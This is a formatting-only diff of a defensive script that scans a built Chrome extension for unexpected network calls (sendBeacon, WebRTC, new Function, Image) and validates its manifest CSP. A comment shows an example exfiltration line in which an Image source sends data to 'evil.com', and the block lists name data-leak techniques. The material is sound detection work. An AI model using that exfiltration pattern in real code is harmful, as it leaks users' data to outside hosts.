@@ -16,13 +16,14 @@
 // Usage:  node scripts/audit-network.mjs [output-dir]
 //         Default output-dir: .output/chrome-mv3
 // ──────────────────────────────────────────────────────────────────────
-import { readFileSync, readdirSync, statSync } from "node:fs";
+import { readdirSync, readFileSync, statSync } from "node:fs";
 import { join, relative } from "node:path";
 import { parse } from "@babel/parser";
 import _traverse from "@babel/traverse";
 
 // Handle both ESM default and CJS interop
-const traverse = typeof _traverse === "function" ? _traverse : _traverse.default;
+const traverse =
+  typeof _traverse === "function" ? _traverse : _traverse.default;
 
 const OUTPUT_DIR = process.argv[2] || ".output/chrome-mv3";
 
@@ -42,20 +43,20 @@ const DANGEROUS_GLOBALS = new Set([
 // Property names that are dangerous when called on an object.
 // Only flagged on MemberExpression calls (obj.sendBeacon(), etc.)
 const DANGEROUS_METHODS = new Set([
-  "sendBeacon",           // navigator.sendBeacon
-  "createDataChannel",    // RTCPeerConnection.createDataChannel
-  "createOffer",          // RTCPeerConnection.createOffer
-  "createAnswer",         // RTCPeerConnection.createAnswer
+  "sendBeacon", // navigator.sendBeacon
+  "createDataChannel", // RTCPeerConnection.createDataChannel
+  "createOffer", // RTCPeerConnection.createOffer
+  "createAnswer", // RTCPeerConnection.createAnswer
   "setRemoteDescription", // RTCPeerConnection.setRemoteDescription
-  "addIceCandidate",      // RTCPeerConnection.addIceCandidate
+  "addIceCandidate", // RTCPeerConnection.addIceCandidate
 ]);
 
 // Dangerous when used with `new`
 const DANGEROUS_CONSTRUCTORS = new Set([
   "Worker",
   "SharedWorker",
-  "Function",   // new Function("return fetch")()
-  "Image",      // new Image().src = "https://evil.com?data=..."
+  "Function", // new Function("return fetch")()
+  "Image", // new Image().src = "https://evil.com?data=..."
 ]);
 
 // ── Allowlist ─────────────────────────────────────────���─────────────
@@ -223,7 +224,10 @@ function scanFile(filePath, relPath) {
         name = callee.property.name;
       }
 
-      if (name && (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))) {
+      if (
+        name &&
+        (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))
+      ) {
         addFinding("new", name, path.node, `new ${name}`);
       }
     },
@@ -243,22 +247,21 @@ function scanFile(filePath, relPath) {
       // Skip if this identifier is being called (handled by CallExpression)
       // or constructed (handled by NewExpression)
       const parent = path.parent;
-      if (
-        parent.type === "CallExpression" && parent.callee === path.node
-      ) return;
-      if (
-        parent.type === "NewExpression" && parent.callee === path.node
-      ) return;
+      if (parent.type === "CallExpression" && parent.callee === path.node)
+        return;
+      if (parent.type === "NewExpression" && parent.callee === path.node)
+        return;
 
       // Skip property access keys: obj.fetch (the "fetch" on the right)
       if (
-        parent.type === "MemberExpression" && parent.property === path.node && !parent.computed
-      ) return;
+        parent.type === "MemberExpression" &&
+        parent.property === path.node &&
+        !parent.computed
+      )
+        return;
 
       // Skip object keys: { fetch: value }
-      if (
-        parent.type === "ObjectProperty" && parent.key === path.node
-      ) return;
+      if (parent.type === "ObjectProperty" && parent.key === path.node) return;
 
       // This is a bare reference — someone is reading the global (likely aliasing)
       addFinding("ref", path.node.name, path.node, `ref:${path.node.name}`);
@@ -275,13 +278,16 @@ function scanFile(filePath, relPath) {
 
       // Skip if parent is already a CallExpression (handled above)
       const parent = path.parent;
-      if (parent.type === "CallExpression" && parent.callee === path.node) return;
+      if (parent.type === "CallExpression" && parent.callee === path.node)
+        return;
 
       const obj = path.node.object;
       // Only flag on known global carriers
       if (
         obj.type === "Identifier" &&
-        (obj.name === "globalThis" || obj.name === "window" || obj.name === "self")
+        (obj.name === "globalThis" ||
+          obj.name === "window" ||
+          obj.name === "self")
       ) {
         addFinding("ref", prop, path.node, `${obj.name}.${prop}`);
       }
@@ -369,7 +375,10 @@ function validateManifestCsp(outputDir) {
   }
 
   // script-src must NOT have 'unsafe-eval' (wasm-unsafe-eval is ok)
-  if (/script-src\s+[^;]*'unsafe-eval'/.test(csp) && !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)) {
+  if (
+    /script-src\s+[^;]*'unsafe-eval'/.test(csp) &&
+    !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)
+  ) {
     errors.push("script-src must not include 'unsafe-eval'");
   }
 
@@ -451,9 +460,7 @@ if (unexpected.length > 0) {
 // ── CSP report ──────────────────────────────────────────────────────
 if (cspErrors.length > 0) {
   console.log("❌ MANIFEST CSP VALIDATION FAILED");
-  console.log(
-    "   The built manifest.json has a weakened or missing CSP.\n",
-  );
+  console.log("   The built manifest.json has a weakened or missing CSP.\n");
   for (const err of cspErrors) {
     console.log(`   • ${err}`);
   }
@@ -471,15 +478,11 @@ console.log("");
 
 if (unexpected.length > 0 || cspErrors.length > 0) {
   if (unexpected.length > 0) {
-    console.log(
-      "⚠️  Review the unexpected findings above.",
-    );
+    console.log("⚠️  Review the unexpected findings above.");
     console.log(
       "   If legitimate, add them to the ALLOWLIST in scripts/audit-network.mjs",
     );
-    console.log(
-      "   If NOT expected, a dependency may be exfiltrating data.",
-    );
+    console.log("   If NOT expected, a dependency may be exfiltrating data.");
   }
   if (cspErrors.length > 0) {
     console.log(
@@ -489,4 +492,6 @@ if (unexpected.length > 0 || cspErrors.length > 0) {
   process.exit(1);
 }
 
-console.log(`✅ All ${allFindings.length} finding(s) are allowlisted. CSP is intact.`);
+console.log(
+  `✅ All ${allFindings.length} finding(s) are allowlisted. CSP is intact.`,
+);
